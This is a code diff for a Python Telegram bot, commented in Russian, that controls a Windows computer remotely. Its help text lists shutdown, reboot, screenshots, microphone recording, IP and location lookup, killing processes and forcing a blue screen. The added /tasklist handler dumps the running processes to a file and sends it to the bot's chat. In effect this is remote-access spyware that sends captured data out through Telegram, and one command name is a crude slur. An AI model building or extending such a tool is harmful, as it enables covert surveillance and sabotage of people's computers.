@@ -49,7 +49,6 @@ def commands(message):
         elif message.text == 'Назад🗿':
                 bot.send_message(message.chat.id,'Вернул вас назад',reply_markup=mainkeyboard)
 
-        
     
         elif message.text == '/off' or message.text == 'Выключить пк⚠️':
                 bot.send_message(message.chat.id,'Компьютер будет выключен!',reply_markup=powerkeyboard)
@@ -57,9 +56,20 @@ def commands(message):
 
         
         elif message.text == '/help' or message.text == 'Помощь⚒':
-                 bot.send_message(message.chat.id,'/off(выкл пк)\n/open(открыть ссылку в браузере)\n/screen(сделать скриншот экрана)\n/process(включить процесс)\n/kill(убить процесс)\n/reboot(перезагрузить пк)\n/window(тест на гея)\n/ip(узнать ip,город,браузер)\n/rep(запустить файл.mp3)\n/record(записать звки с микрофона)\n/bluesreen(синий экран на пк)\n/oc(выведит операционную систему и имя пк',reply_markup=mainkeyboard)
+                 bot.send_message(message.chat.id,'/off(выкл пк)\n/open(открыть ссылку в браузере)\n/screen(сделать скриншот экрана)\n/process(включить процесс)\n/kill(убить процесс)\n/reboot(перезагрузить пк)\n/window(тест на гея)\n/ip(узнать ip,город,браузер)\n/rep(запустить файл.mp3)\n/record(записать звки с микрофона)\n/bluesreen(синий экран на пк)\n/oc(выведит операционную систему и имя пк)\n/tasklist(узнать список запущенных процессов)',reply_markup=mainkeyboard)
                 
 
+        elif message.text == '/tasklist':
+                try:
+                        bot.send_chat_action(message.chat.id,'upload_document')
+                        os.system('tasklist>  C:\\ProgramData\\Tasklist.txt')
+                        tasklist = open('C:\\ProgramData\\Tasklist.txt')
+                        bot.send_document(message.chat.id,tasklist)
+                        tasklist.close()
+                        os.remove('C:\\ProgramData\\Tasklist.txt')
+                except:
+                        bot.send_message(message.chat.id,'Ошибка,не удалось получилось список ')               
+                
               
         
         elif message.text == '/open' or message.text == 'Браузер🟡':
